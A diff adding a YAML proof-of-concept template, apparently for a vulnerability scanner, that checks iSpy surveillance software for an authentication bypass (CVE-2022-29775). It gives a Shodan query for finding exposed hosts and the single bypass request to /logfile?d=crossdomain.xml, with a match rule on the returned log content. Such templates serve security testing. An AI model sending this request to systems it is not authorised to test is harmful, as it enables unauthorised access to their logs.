@@ -1,0 +1,16 @@
+id: poc-yaml-ispy-crossdomain-xml-authentication-bypass
+info:
+  name: iSpy crossdomain.xml 身份认证绕过漏洞(CVE-2022-29775)
+  severity: critical
+  tags:
+  - CVE-2022-29775
+  - 失效的身份认证
+  finger: ispy
+  shodan: http.html:"iSpy is running"
+requests:
+- method: GET
+  path: /logfile?d=crossdomain.xml
+  expression: status_code == 200 && contains(body,"iSpy") && contains(body,"Log Start")
+    && contains(body,"Log File") && contains(headers,"text/html")
+variables: {}
+transport: http
